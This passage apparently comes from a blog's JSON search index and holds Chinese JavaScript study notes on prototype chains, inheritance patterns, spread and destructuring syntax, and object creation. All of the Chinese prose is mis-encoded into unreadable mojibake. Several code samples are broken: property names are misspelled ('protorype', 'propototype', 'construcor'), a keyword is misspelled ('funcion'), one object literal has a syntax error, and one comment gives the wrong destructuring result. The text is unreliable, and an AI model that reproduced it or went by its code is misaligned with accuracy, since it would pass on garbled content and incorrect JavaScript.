å‡½æ•°ï¼ŒæŒ‡å›åŸæ¥çš„åŸå‹    name: 'humen',    sayHello() {        console.log('My name is '+ this.name);    }}  å¯¹è±¡å­—é¢é‡æ–¹å¼ï¼Œéœ€è¦é‡å†™constructorå±æ€§ï¼Œä½¿å¾—[[Enumerabele]]é”®å€¼ä¸ºtrueã€‚  åŸç”Ÿçš„constructorå±æ€§é»˜è®¤ä¸å¯æšä¸¾ï¼Œéœ€è¦ä½¿ç”¨Object.defineProperty()ä¿®æ”¹å›æ¥// 2. ä¿®æ”¹ Object.defineProperty()Object.defineProperty(Person.prototype, \"constructor\", {    enumerable: false,    value: Person\t})åŸå‹é“¾â€‹\t**å¯¹è±¡çš„åŸå‹å±æ€§ï¼ŒæŒ‡å‘åˆ›å»ºå®ƒçš„æ„é€ å‡½æ•°object.__proto__.constructorçš„åŸå‹å±æ€§ __proto__æ‰€æŒ‡å‘çš„åŸå‹å¯¹è±¡ **â€‹\tä¿®æ”¹å®ä¾‹æ‰€åœ¨çš„åŸå‹é“¾ï¼Œå¯ä»¥ä½¿ç”¨Object.setprototypeOf()ä½†ä¸å»ºè®®ã€‚åº”è¯¥é€šè¿‡Object.create(construct)ä¸ºæ–°å¯¹è±¡æŒ‡å®šæ„é€ å‡½æ•°ã€‚æˆå‘˜æŸ¥æ‰¾æœºåˆ¶ï¼ˆå°±è¿‘åŸåˆ™ï¼‰  è¿™ä¸ªå¯¹è±¡è‡ªèº«æœ‰æ²¡æœ‰ è¿™ä¸ªå±æ€§ï¼ˆæˆ–æ–¹æ³•ï¼‰  æ²¡æœ‰ï¼ŒæŸ¥æ‰¾å®ƒçš„åŸå‹ ï¼ˆ__proto__æŒ‡å‘çš„prototypeåŸå‹å¯¹è±¡ï¼‰  è¿˜æ˜¯æ²¡æœ‰ï¼ŒæŸ¥æ‰¾åŸå‹çš„åŸå‹ï¼ˆObjectçš„åŸå‹å¯¹è±¡ï¼‰  ä¸€æ¬¡ç±»æ¨ï¼Œç›´è‡³æ‰¾åˆ° null ä¸ºæ­¢å®ä¾‹åªæœ‰æŒ‡å‘åŸå‹çš„æŒ‡é’ˆï¼Œæ²¡æœ‰æŒ‡å‘æ„é€ å‡½æ•°çš„æŒ‡é’ˆã€‚â€‹\tå®ä¾‹åœ¨åŸå‹æ›´æ”¹å‰å·²ç»å­˜åœ¨ï¼Œä¾ç„¶å¯ä»¥åœ¨åŸå‹æ›´æ”¹åæŸ¥æ‰¾åˆ°æœ€æ–°çš„ã€‚å› ä¸ºæœç´¢å€¼çš„è¿‡ç¨‹æ˜¯åŠ¨æ€çš„ã€‚å®ä¾‹ä¸åŸå‹ä¹‹é—´çš„æ¾æ•£å…³ç³»ã€‚â€‹\tå®ä¾‹åœ¨æ„é€ å‡½æ•°é‡å†™å‰å·²ç»å­˜åœ¨ï¼Œä¾ç„¶å¼•ç”¨çš„æ˜¯æœ€åˆçš„åŸå‹ï¼›é‡å†™ä¼šåˆ‡æ–­æœ€åˆåŸå‹ä¸æ„é€ å‡½æ•°çš„è”ç³»ã€‚inæ“ä½œç¬¦å•ç‹¬ä½¿ç”¨ inæ“ä½œç¬¦â€‹\té€šè¿‡å¯¹è±¡è®¿é—®æŒ‡å®šçš„å±æ€§æ—¶ï¼Œè¿”å›trueï¼Œæ— è®ºè¿™ä¸ªå±æ€§æ˜¯åœ¨å®ä¾‹è¿˜æ˜¯åŸå‹ä¸Šã€‚â€‹\téœ€è¦ä½¿ç”¨.hasOwnProperty('..') ï¼Œæ‰å¯ä»¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨äºè‡ªæœ‰çš„å±æ€§ä¸Šã€‚function hasPrototyperty(object, name){    return !object.hasOwnProperty(name) &amp;&amp; (name in object)}for-in å¾ªç¯ä¸­ä½¿ç”¨â€‹\tå¯ä»¥é€šè¿‡å¯¹è±¡è®¿é—®ã€å¯ä»¥è¢«æšä¸¾çš„å±æ€§ï¼Œéƒ½ä¼šè¿”å›ã€‚åŒ…æ‹¬å®ä¾‹å±æ€§ã€åŸå‹å±æ€§ã€‚function Person(name) {    this.name = name;}Person.prototype.local = 'shanhai';Person.prototype.sayHello = function(){    console.log('my name is' + this.name)}let p1 = new Person();// è·å–å¯¹è±¡ä¸Šæ‰€æœ‰å¯æšä¸¾çš„å®ä¾‹å±æ€§Object.keys(Person.protorype); // ['local', 'sayHello']Object.keys(p1);\t// ['name']// è·å–å¯¹è±¡ä¸Šæ‰€æœ‰å®ä¾‹å±æ€§ï¼Œæ— è®ºæ˜¯å¦å¯ä»¥æšä¸¾ (constructor ä¸ºä¸å¯æšä¸¾)Object.getOwnPropertyNames(Person.prototype); // Â ['constructor', 'local', 'sayHello']Object.getOwnPropertyNames(Person); // ['length', 'name', 'arguments', 'caller', 'prototype']// è·å–å¯¹è±¡ä¸Šæ‰€æœ‰çš„å®ä¾‹å±æ€§ï¼Œé”®ä½ç¬¦å·Object.getOwnPropertyNames()â€‹\tå®ƒä»¬æšä¸¾é¡ºåºæ˜¯ç¡®å®šçš„ã€‚:one: å…ˆä»¥å‡åºæšä¸¾æ•°å€¼é”®ï¼Œ:two: æ’å…¥é¡ºåºæšä¸¾å­—ç¬¦ä¸²å’Œç¬¦å·é”® :three: å¯¹è±¡å­—é¢é‡å®šä¹‰çš„é”®ï¼Œä»¥é€—å·åˆ†éš”é¡ºåºæ’å…¥ç»§æ‰¿ 6 ç§æ–¹æ³•1ã€åŸå‹é“¾ç»§æ‰¿ï¼›      é€šè¿‡å°†ä¸€ä¸ªç±»å‹Açš„å®ä¾‹èµ‹å€¼ç»™å¦ä¸€ä¸ªBæ„é€ å‡½æ•°çš„åŸå‹å®ç°çš„ â€“ B ç»§æ‰¿ A        é‡ç‚¹ï¼šè®©æ–°å®ä¾‹çš„åŸå‹ç­‰äºçˆ¶ç±»çš„å®ä¾‹ â€”â€” å­ç±»çš„.prototype = new çˆ¶ç±»()ï¼Œå­ç±»çš„å®ä¾‹ä¹Ÿæ˜¯çˆ¶ç±»çš„å®ä¾‹    ç‰¹ç‚¹ï¼š1ã€å®ä¾‹å¯ç»§æ‰¿çš„å±æ€§æœ‰ï¼šå®ä¾‹çš„æ„é€ å‡½æ•°çš„å±æ€§ï¼Œçˆ¶ç±»æ„é€ å‡½æ•°å±æ€§ï¼Œçˆ¶ç±»åŸå‹çš„å±æ€§ã€‚    ç¼ºç‚¹ï¼š    1ã€æ–°å®ä¾‹æ— æ³•å‘çˆ¶ç±»æ„é€ å‡½æ•°ä¼ å‚ã€‚    2ã€ç»§æ‰¿å•ä¸€ã€‚    3ã€æ‰€æœ‰æ–°å®ä¾‹éƒ½ä¼šå…±äº«çˆ¶ç±»å®ä¾‹çš„å±æ€§ã€‚ï¼ˆåŸå‹ä¸Šçš„å±æ€§æ˜¯å…±äº«çš„ï¼Œä¸€ä¸ªå®ä¾‹ä¿®æ”¹äº†åŸå‹å±æ€§ï¼Œå¦ä¸€ä¸ªå®ä¾‹çš„åŸå‹å±æ€§ä¹Ÿä¼šè¢«ä¿®æ”¹ï¼ï¼‰    4ã€å­ç±».prototype æ·»åŠ å±æ€§å¿…é¡»åœ¨ æŒ‡å‘äº†çˆ¶ç±»ä¹‹åï¼Œå¦åˆ™ä¼šè¢«è¦†ç›–        æŸ¥çœ‹ç§æœ‰å±æ€§ï¼šhasOwnProperty() â€” åŒ…æ‹¬æŸ¥æ‰¾åŸå‹é“¾ä¸­çš„ [prototype] çš„Property  2ã€å€Ÿç”¨æ„é€ ç»§æ‰¿ï¼ˆä¹Ÿç§°ä¼ªé€ å¯¹è±¡æˆ–ç»å…¸ç»§æ‰¿ï¼‰ï¼›  function Child(name){ Parent1.call(thisï¼Œname), Parent2.call(thisï¼Œname)}  ä¼˜ç‚¹          å®ç°å¤šç»§æ‰¿ï¼Œé€šè¿‡callæ”¹å˜çˆ¶ç±»çš„this      åˆ›å»ºçš„å­ç±»å®ä¾‹å¯ä»¥å‘çˆ¶ç±»ä¼ é€’å‚æ•°      è§£å†³äº†åŸå‹é“¾ç»§æ‰¿ä¸­ï¼Œæ‰€æœ‰å­ç±»çš„å®ä¾‹å…±äº«çˆ¶ç±»å®ä¾‹çš„å±æ€§ã€‚        ç¼ºç‚¹          å®ä¾‹æ˜¯å­ç±»çš„å®ä¾‹ï¼Œä¸æ˜¯çˆ¶ç±»çš„å®ä¾‹ã€‚      åªèƒ½ç»§æ‰¿çˆ¶ç±»å®ä¾‹å±æ€§ã€æ–¹æ³•ï¼›ä¸èƒ½ç»§æ‰¿çˆ¶ç±»åŸå‹ä¸Šçš„æ–¹æ³•      å­ç±»å®é™…ä¸Šæ˜¯å¤åˆ¶äº†çˆ¶ç±»çš„æ–¹æ³•å½“ä½œè‡ªå·±çš„æ–¹æ³•ï¼Œå¤šä¸ªç›¸åŒçš„å­ç±»å ç”¨è¾ƒå¤§å†…å­˜      çˆ¶ç±»çš„æ–¹æ³•æ”¹å˜æ—¶ï¼Œå·²ç»å­˜åœ¨çš„å­ç±»å®ä¾‹å¹¶ä¸èƒ½æ›´æ–°æ–¹æ³•      3ã€ç»„åˆç»§æ‰¿ç»„åˆï¼šåŸå‹é“¾ç»§æ‰¿ + å€Ÿç”¨æ„é€ å‡½æ•°ç»§æ‰¿.call (è°ƒç”¨å‡½æ•°è€…ï¼Œ å‚æ•°1ï¼Œ å‚æ•°2);æ”¹å˜thisçš„æŒ‡å‘function fn(x, y) { console.log(this); }let o = {}fn(1, 2); // thisæŒ‡å‘windowfn.call(o, 1, 2); // thisæŒ‡å‘o  ä¸»è¦åº”ç”¨ï¼šç»„åˆç»§æ‰¿æ„é€ å‡½æ•° + åŸå‹å¯¹è±¡ï¼ˆES5ï¼‰// æ„é€ ç»§æ‰¿ï¼šå€Ÿç”¨çˆ¶æ„é€ å‡½æ•°ï¼Œç»§æ‰¿å…¶å±æ€§function Father(name, age){    this.name = name;    this.age = age;}function Son(name, age){    // thisæŒ‡å‘Son  è°ƒç”¨Fatherçš„æ„é€ å‡½æ•°ï¼Œ    // å°†son.this æ›¿æ¢æ‰ father.thisï¼Œäºæ˜¯sonå°±æ‹¥æœ‰äº†fatherçš„å±æ€§    Father.call(this, name, age);    // ... å­ç±»çš„å±æ€§å’Œæ–¹æ³•}// åŸå‹å¯¹è±¡ ç»§æ‰¿å…¶æ–¹æ³•// ã€é”™è¯¯ç¤ºèŒƒã€‘Son.propototype = Father.prototype;Son.propototype.exam = function() {}; // ä¿®æ”¹Sonæ„é€ å‡½æ•°çš„ æ–¹æ³•// console.log(Father) ä¹Ÿå­˜åœ¨Sonçš„æ–¹æ³• â€”â€”â€”â€” prototypeæ˜¯å¯¹è±¡ï¼Œèµ‹å€¼ä¼ é€’æ˜¯å¼•ç”¨ï¼Œä¸¤è€…æŒ‡å‘åŒä¸€ä¸ªå†…å­˜ç©ºé—´ï¼›ç»§æ‰¿åº”æ‰§è¡Œçˆ¶ç±»çš„å®ä¾‹è€Œä¸æ˜¯çˆ¶ç±»å¯¹è±¡// ã€æ­£ç¡®ç¤ºèŒƒã€‘Son.prototype = new Father();  // æ–°å»ºä¸€ä¸ªFatherå®ä¾‹ï¼Œæ—¢æœ‰å±æ€§ã€åˆæœ‰æ–¹æ³•ï¼› ä½¿ç”¨å¯¹è±¡çš„æ–¹å¼ä¿®æ”¹prototypeï¼Œä¼šä½¿ä¿®æ”¹åŸå‹é“¾Son.prototype.construcor = Son; // åˆ©ç”¨construcor æŒ‡å›åŸæ¥çš„åŸå‹å¯¹è±¡let son = new Son(\"sonName\",\"sonAge\");â€‹\tæ ¸å¿ƒæ€æƒ³ï¼šä½¿ç”¨åŸå‹é“¾ç»§æ‰¿åŸå‹ä¸Šçš„å±æ€§å’Œæ–¹æ³•ï¼Œé€šè¿‡å€Ÿç”¨æ„é€ å‡½æ•°ç»§æ‰¿å®ä¾‹å±æ€§ã€‚â€‹\tç»„åˆç»§æ‰¿ä»ç„¶ä¿ç•™äº†instanceofæ“ä½œç¬¦å’ŒisPrototypeOf()æ–¹æ³•è¯†åˆ«å¯¹è±¡çš„èƒ½åŠ› â€”â€” å…³æ³¨ç±»å‹å’Œæ„é€ å‡½æ•°çš„åœºæ™¯ã€‚â€‹\tå­˜åœ¨é—®é¢˜ï¼šçˆ¶ç±»çš„æ„é€ å‡½æ•°å§‹ç»ˆä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œå¯¼è‡´æ€§èƒ½æµªè´¹â€‹\t:one: åˆ›å»ºå­ç±»åŸå‹æ—¶è°ƒç”¨ï¼šè·å–åŸå‹å±æ€§ â€”â€” çˆ¶ç±»å®ä¾‹å±æ€§æˆä¸ºå­ç±»åŸå‹å±æ€§â€‹\t:two: å­ç±»æ„é€ å‡½æ•°ä¸­è°ƒç”¨ â€”â€” æ–°å¯¹è±¡ä¸Šåˆ›å»ºå®ä¾‹å±æ€§ï¼Œè¦†ç›–çˆ¶ç±»å®ä¾‹å±æ€§â€‹\tå¯„ç”Ÿå¼ç»„åˆç»§æ‰¿å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜4ã€åŸå‹å¼ç»§æ‰¿â€‹\tobject()æ–¹æ³•é€šè¿‡å¯¹ä¼ å…¥å¯¹è±¡æ‰§è¡Œäº†ä¸€æ¬¡æµ…å¤åˆ¶â€”â€”æ–°å¯¹è±¡çš„åŸå‹ä¸Šæ—¢æœ‰åŸå§‹å€¼å±æ€§ï¼Œåˆæœ‰å¼•ç”¨å€¼å±æ€§ã€‚å­ç±»å¯¹äºå¼•ç”¨å€¼å±æ€§çš„ä¿®æ”¹ï¼Œéƒ½ä¼šåŒæ­¥å½±å“ã€‚â€‹\té€‚ç”¨äºï¼šä¸éœ€è¦å•ç‹¬åˆ›å»ºæ„é€ å‡½æ•°ï¼Œä½†ä»ç„¶éœ€è¦åœ¨å¯¹è±¡é—´å…±äº«ä¿¡æ¯ã€‚// 06å¹´ï¼ŒDouglas Crockford æ‰€è‘—æ–‡ç« æå‡ºçš„ä¸€ä¸ªå‡½æ•°ï¼šfunction object(o){    function F() {}\t// åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ„é€ å‡½æ•°    F.prototype = o; // å°†ä¼ å…¥çš„å¯¹è±¡ä½œä¸ºè¿™ä¸ªæ„é€ å‡½æ•°çš„åŸå‹    return new F;\t// è¿”å›è¿™ä¸ªä¿®æ”¹è¿‡åŸå‹çš„å¯¹è±¡} // F extends oï¼Œå†å¯¹è¿”å›çš„Få¯¹è±¡è¿›è¡Œä¿®æ”¹// ES5 é€šè¿‡æ–°å¢ Object.create() æ–¹æ³•ï¼Œå°†åŸå‹å¼ç»§æ‰¿çš„æ¦‚å¿µè§„èŒƒåŒ–äº†let Person = {    name: \"Nicholas\",    friends: ['sell','court','bar']}let onePerson = Object.create(Person,{ // ä»…æœ‰ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ•ˆæœä¸ç¬¬ä¸€ä¸ªå‡½æ•°ä¸€æ ·    name:{        value: \"Gred\"; // ç¬¬äºŒä¸ªå‚æ•°ä¸ Object.defineProperties() ç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·ï¼Œæ–°å¢å±æ€§è¦é€šè¿‡è‡ªå·±æè¿°ç¬¦    }})5ã€å¯„ç”Ÿå¼ç»§æ‰¿â€‹\tæ€è·¯ç±»ä¼¼äº å¯„ç”Ÿæ„é€ å‡½æ•°å’Œå·¥å‚æ¨¡å¼ï¼š åˆ›å»ºä¸€ä¸ªå®ç°ç»§æ‰¿çš„å‡½æ•°ï¼Œä»¥æŸç§æ–¹å¼å¢å¼ºå¯¹è±¡ï¼Œç„¶åè¿”å›è¿™ä¸ªå¯¹è±¡ã€‚function createSub(original){    let clone = object(original); // åˆ›å»ºä¸€ä¸ªçˆ¶ç±»å®ä¾‹    clone.sayHi = function(){        console.log(\"hi!\")    };    return clone;}â€‹\tè¿”å›çš„ clone å¯¹è±¡ç›¸è¾ƒäº originalå¯¹è±¡è€Œè¨€ï¼Œé™¤äº†æ‹¥æœ‰å…¶æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œè¿˜æ‹¥æœ‰è‡ªå·±çš„æ–¹æ³•ã€‚ä½†æ˜¯ä¼šå¯¼è‡´å‡½æ•°éš¾ä»¥é‡ç”¨ã€‚â€‹\té€‚ç”¨èŒƒå›´ï¼š ä¸åŸå‹é“¾ç»§æ‰¿ä¸€æ ·ï¼Œå…³æ³¨å¯¹è±¡è€Œä¸åœ¨ä¹ç±»å‹å’Œæ„é€ å‡½æ•°çš„åœºæ™¯6ã€å¯„ç”Ÿç»„åˆå¼ç»§æ‰¿ â€‹\tå€Ÿç”¨æ„é€ å‡½æ•°ç»§æ‰¿å±æ€§ï¼ˆå–å¾—çˆ¶ç±»åŸå‹çš„å‰¯æœ¬ï¼‰ï¼Œç»„åˆç»§æ‰¿æ–¹æ³•ï¼ˆç»™å‰¯æœ¬è®¾ç½®constructorå±æ€§ï¼Œè§£å†³é‡å†™åŸå‹ä¿®æ”¹åˆ°é»˜è®¤æ„é€ å‡½æ•°ï¼‰ã€‚function inheritPrototype(subType, superType){    let prototype = object(superType.prototype); // å–å¾—çˆ¶ç±»åŸå‹çš„å‰¯æœ¬    prototype.constructor = subType; // æ¢å¤é»˜è®¤æ„é€ å‡½æ•°    subType.prototype = prototype; \t// æ–°åˆ›å»ºçš„å¯¹è±¡ä½œä¸ºå­ç±»çš„åŸå‹}â€‹\tä»…è°ƒç”¨ä¸€æ¬¡superTypeæ„é€ å‡½æ•°ï¼Œé¿å…subType.prototypeä¸Šè·å¾—ä¸å¿…è¦ä¹Ÿç”¨ä¸åˆ°å±æ€§ã€‚â€‹\tåŸå‹é“¾ä»ç„¶ä¿æŒä¸å˜ï¼Œå› æ­¤ä»ç„¶ä¿ç•™äº†instanceofæ“ä½œç¬¦å’ŒisPrototypeOf()æ–¹æ³•è¯†åˆ«å¯¹è±¡çš„èƒ½åŠ› â€”â€” å…³æ³¨ç±»å‹å’Œæ„é€ å‡½æ•°çš„åœºæ™¯ã€‚"
  },
  
  {
    "title": "4. å±•å¼€è¯­æ³•  & è§£æ„è¯­æ³•",
    "url": "/posts/4.%E5%B1%95%E5%BC%80%E8%AF%AD%E6%B3%95&%E8%A7%A3%E6%9E%84%E8%AF%AD%E6%B3%95/",
    "categories": "JavaScript",
    "tags": "javascriptBase",
    "date": "2022-08-21 00:00:00 +0800",
    





    
    "snippet": "å±•å¼€è¯­æ³•  â€‹\tå°†æ•°ç»„ã€å¯¹è±¡ è½¬æ¢ä¸ºç”¨ é€—å·åˆ†éš”çš„å‚æ•°åºåˆ—åœ¨å‡½æ•°ä¸­åº”ç”¨      å‡½æ•°è°ƒç”¨ (æ•°ç»„å…ƒç´ è¿­ä»£ä¸ºå‡½æ•°å‚æ•°)    ` myFunction(â€¦ args); == myFunction.apply(null, args);`    ä½¿ç”¨new Function()å®šä¹‰ï¼Œå…¶ä¼ å‚çš„æœ€åä¸€ä¸ªä½œä¸ºå‡½æ•°ä½“ï¼Œå…¶ä»–ä½œä¸ºå‚æ•°ï¼Œä¼ å‚éƒ½å¾—æ˜¯å­—ç¬¦ä¸²        ä¼ å‚ç»™æ„é€ å‡½æ•°    .applyæ‰§è¡Œ...",
    "content": "å±•å¼€è¯­æ³•  â€‹\tå°†æ•°ç»„ã€å¯¹è±¡ è½¬æ¢ä¸ºç”¨ é€—å·åˆ†éš”çš„å‚æ•°åºåˆ—åœ¨å‡½æ•°ä¸­åº”ç”¨      å‡½æ•°è°ƒç”¨ (æ•°ç»„å…ƒç´ è¿­ä»£ä¸ºå‡½æ•°å‚æ•°)    ` myFunction(â€¦ args); == myFunction.apply(null, args);`    ä½¿ç”¨new Function()å®šä¹‰ï¼Œå…¶ä¼ å‚çš„æœ€åä¸€ä¸ªä½œä¸ºå‡½æ•°ä½“ï¼Œå…¶ä»–ä½œä¸ºå‚æ•°ï¼Œä¼ å‚éƒ½å¾—æ˜¯å­—ç¬¦ä¸²        ä¼ å‚ç»™æ„é€ å‡½æ•°    .applyæ‰§è¡Œçš„æ˜¯.callï¼Œè€Œä¸æ˜¯æ„é€ constuct    Object.create() æ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œä½¿ç”¨ç°æœ‰çš„å¯¹è±¡æ¥ä½œä¸ºæ–°åˆ›å»ºå¯¹è±¡çš„åŸå‹ï¼ˆprototypeï¼‰ã€‚    // å±•å¼€è¯­æ³•ï¼šlet arr = [1003,3,2];let d = new Date(...arr); //ä¼ å…¥(1003, 3, 2)   // ä¸ä½¿ç”¨å±•å¼€è¯­æ³•function applyAndNew(constructor, args) {   function partial () {      return constructor.apply(this, args); // å°†æ•°ç»„å±•å¼€ä¼ é€’ç»™æ„é€ å‡½æ•°   };   if (typeof constructor.prototype === \"object\") { // å¦‚æœæ„é€ å‡½æ•°çš„ç±»å‹æ˜¯å¯¹è±¡      partial.prototype = Object.create(constructor.prototype); // é‡æ–°æŒ‡å‘å…¶æ„é€ å‡½æ•°   }   return partial;}var myConstructorWithArguments = applyAndNew(myConstructor, myArguments); // éœ€è¦è‡ªå®šä¸€ä¸ªæ„é€ å‡½æ•°      åœ¨æ•°ç»„ä¸­çš„åº”ç”¨      å¤åˆ¶åˆ°æ–°çš„å‡½æ•°    var lyrics = ['head', ...parts, 'and', 'toes'];         è¿æ¥ä¸¤ä¸ªå‡½æ•°    var list3 = [...list1, ...list2]  ==  var arr3 = arr1.concat(arr2);        æ•°ç»„æ’å…¥ æ–°æ•°ç»„    å¼€å¤´æ’å…¥ï¼švar list1 = [...list2, ...list1] == Array.prototype.unshift.apply(arr1, arr2)    ç»“å°¾æ’å…¥ï¼švar list1 = [...list1, ...list2] ==  for( const item of list2) { list1.push(item); }  åœ¨å¯¹è±¡ä¸­çš„åº”ç”¨â€‹\tå·²æœ‰ å¯¹è±¡çš„æ‰€æœ‰å¯æšä¸¾ (enumerable) å±æ€§ æ‹·è´åˆ°æ–°æ„é€ çš„å¯¹è±¡ä¸­â€‹\tvar mergedObj = { ...obj1, ...obj2 };   æµ…æ‹·è´å¯¹DOMèŠ‚ç‚¹æ“ä½œÂ· document.querySelectorAll(â€œ â€œ)è·å–èŠ‚ç‚¹ä¸ºé›†åˆï¼Œä¸€ä¸ªç±»æ•°ç»„ï¼Œä½¿ç”¨mapå¾—è½¬åŒ–ä¸ºæ•°ç»„Â·  Array.from() æ–¹æ³•å¯¹ä¸€ä¸ªç±»ä¼¼æ•°ç»„æˆ–å¯è¿­ä»£å¯¹è±¡åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼Œæµ…æ‹·è´çš„æ•°ç»„å®ä¾‹ã€‚Array.form(document.querySelectorAll(\"\")).map(function(item){})Â· ä½¿ç”¨èŠ‚ç‚¹åŸå‹é“¾ä¸Šçš„mapå‡½æ•° call()Array.prototype.map.call(div,function(item){})Â· å±•å¼€è¯­æ³•[...div].map(function(item){    item.addEventListener(\"click\",function(){        this.classList.toggle(\"hide\");    });});å‰©ä½™å‚æ•°â€‹\tå…è®¸æˆ‘ä»¬å°†ä¸€ä¸ªä¸å®šä¸ªæ•°çš„å‚æ•°è¡¨ç¤ºä¸ºä¸€ä¸ªæ•°ç»„ï¼Œç»“åˆè§£æ„è¯­æ³•å°†å‰©ä½™å˜é‡å…¨éƒ¨å¸æ”¶è¿‡æ¥ï¼Œ...argséœ€æ”¾åœ¨ç»“æ„çš„æœ€åä¸€ä¸ªfuncion sum(first, ...args){    console.log(first); // 1    console.log(args); \t// [3,4,5]    let total = 0;    args.forEach(item =&gt; total += item);    console.log(total) // 3 + 4 + 5 = 12}sum(1,3,4,5);// å‰©ä½™å‚æ•° &amp; è§£æ„å‡½æ•°let [s1, ...s2] = [1,3,4,3,5,6]; // s1 = 1, s2 = [3,4,3,5,6]ç»“åˆä½¿ç”¨let {name:myName} = {name:[1,2,3,4],age:'20',sex:'ç”·'}console.log(myName); // [1,2,3,4]let {name:myAge} = {name:[1,2,3,4],age:'20',sex:'ç”·'}console.log(myAge); // '20'æ•°ç»„å»é‡let arr = [12,54,12,75,12]let item = [...new Set(arr)]console.log(item)è§£æ„è¯­æ³•â€‹\tå¯¹è±¡è§£æ„ï¼šä½¿ç”¨ä¸å¯¹è±¡åŒ¹é…çš„ç»“æ„æ¥å®ç°å¯¹è±¡å±æ€§èµ‹å€¼â€‹\tå½“å…ƒç´ å­˜åœ¨å¼•ç”¨å¯¹è±¡æ—¶ï¼Œå‡ºç°æµ…æ‹·è´çš„é—®é¢˜// 1. å·¦ä¾§çš„æ•°ç»„ã€å¯¹è±¡ æ‰¹é‡èµ‹å€¼ç»™ å³è¾¹çš„å˜é‡let [name,age] = [\"å¼ ä¸‰\",\"20\"];let person = { name:'Matt', age:27}let {name:name1, age:age1} = person; // name1 = 'Matte',age1 = 27let {name, age} = person; // name = 'Matte',age = 27// 2. ä¸ºä¸ªåˆ«å…ƒç´ æ·»åŠ é»˜è®¤å€¼let [name,age=20] = [\"å¼ ä¸‰\",\"20\"];// 3. ä»…å–å…¶ä¸­æŸä¸ªå€¼let [,age] =  [\"å¼ ä¸‰\",\"20\"]â€‹\tåœ¨å†…éƒ¨ä½¿ç”¨å‡½æ•° ToObject() ï¼ˆä¸èƒ½åœ¨è¿è¡Œç¯å¢ƒä¸­ç›´æ¥è®¿é—®ï¼‰æŠŠæ•°æ®æºç»“æ„è½¬ä¸ºå¯¹è±¡ â€”â€” åŸå§‹å€¼ä¼šè¢«å½“æˆå¯¹è±¡ã€‚Null &amp; undefined ä¸èƒ½è¢«è§£æ„ï¼Œå¦åˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚â€‹\tå¦‚æœç»™äº‹å…ˆå£°æ˜çš„å˜é‡èµ‹å€¼ï¼Œåˆ™èµ‹å€¼è¡¨è¾¾å¼å¿…é¡»åŒ…æ‹¬åœ¨æ‹¬å·å†…ã€‚let name, age, page;let person = {    personName : 'matt',    personAge : 27,    personPage:{ title: 'my life'}}let copy = {}// åµŒå¥—è§£æ„({personPage: copy.personPage} = person); //  coye = {personPage:{ title: 'my life'}({personJob: job} = person); // æŠ¥é”™! å¤–éƒ¨æœªå£°æ˜jobï¼Œå†…éƒ¨æœªå£°æ˜personJobï¼Œä¸èƒ½ä½¿ç”¨åµŒå¥—è§£æ„// å‚æ•°ä¸Šä¸‹æ–‡åŒ¹é…ï¼š åœ¨å‡½æ•°ç­¾åä¸­å£°æ˜å‡½æ•°æå†…ä½¿ç”¨çš„å±€éƒ¨å˜é‡function printPerson(foo, {personName:name}, bar){\tconsole.log(name)}â€‹\tè§£æ„è¡¨è¾¾å¼æ¶‰åŠå¤šä¸ªèµ‹å€¼ï¼Œè‡ªèµ‹å€¼å‡ºé”™åé¢éƒ½ä¼šå¤±è´¥ï¼›åˆ™æ•´ä¸ªè§£æ„èµ‹å€¼åªä¼šå®Œæˆä¸€éƒ¨åˆ†ã€‚"
  },
  
  {
    "title": "3.å¯¹è±¡",
    "url": "/posts/3.%E5%AF%B9%E8%B1%A1/",
    "categories": "JavaScript, å¯¹è±¡",
    "tags": "javascriptBase",
    "date": "2022-08-18 00:00:00 +0800",
    





    
    "snippet": "å¯¹è±¡â€‹\tECMA-262å®šä¹‰å¯¹è±¡ä¸ºï¼šä¸€ç»„å±æ€§çš„æ— åºé›†åˆ  â€”â€” å¯¹è±¡çš„æ¯ä¸ªå±æ€§æˆ–æ–¹æ³•éƒ½æœ‰ä¸€ä¸ªåç§°æ¥æ ‡è¯†(key) ï¼Œå¹¶æ˜ å°„åˆ°ä¸€ä¸ªå€¼(value)ï¼Œæ•£åˆ—å€¼ä¸‰ç§åˆ›å»ºæ–¹æ³•  new Object()  å­—é¢é‡åˆ›å»ºå¯¹è±¡ let obj = {}  æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡          function obj() = { }      æµªè´¹ç©ºé—´ï¼šæ¯ä¸ªæ–¹æ³•éƒ½éœ€è¦ä¸€ä¸ªå†…å­˜ç©ºé—´å­˜æ”¾      æˆå‘˜å¯¹è±¡  é™...",
    "content": "å¯¹è±¡â€‹\tECMA-262å®šä¹‰å¯¹è±¡ä¸ºï¼šä¸€ç»„å±æ€§çš„æ— åºé›†åˆ  â€”â€” å¯¹è±¡çš„æ¯ä¸ªå±æ€§æˆ–æ–¹æ³•éƒ½æœ‰ä¸€ä¸ªåç§°æ¥æ ‡è¯†(key) ï¼Œå¹¶æ˜ å°„åˆ°ä¸€ä¸ªå€¼(value)ï¼Œæ•£åˆ—å€¼ä¸‰ç§åˆ›å»ºæ–¹æ³•  new Object()  å­—é¢é‡åˆ›å»ºå¯¹è±¡ let obj = {}  æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡          function obj() = { }      æµªè´¹ç©ºé—´ï¼šæ¯ä¸ªæ–¹æ³•éƒ½éœ€è¦ä¸€ä¸ªå†…å­˜ç©ºé—´å­˜æ”¾      æˆå‘˜å¯¹è±¡  é™æ€æˆå‘˜ï¼šç”±æ„é€ å‡½æ•°æœ¬èº«è®¿é—®  å®ä¾‹æˆå‘˜ï¼šç”±å®ä¾‹åŒ–å¯¹è±¡è®¿é—®å¯¹è±¡æ–¹æ³•Object.keys(obj)ï¼šç”¨äºè·å–å¯¹è±¡è‡ªèº« æ‰€æœ‰çš„ å±æ€§ï¼›è¿”å› æ•°ç»„ 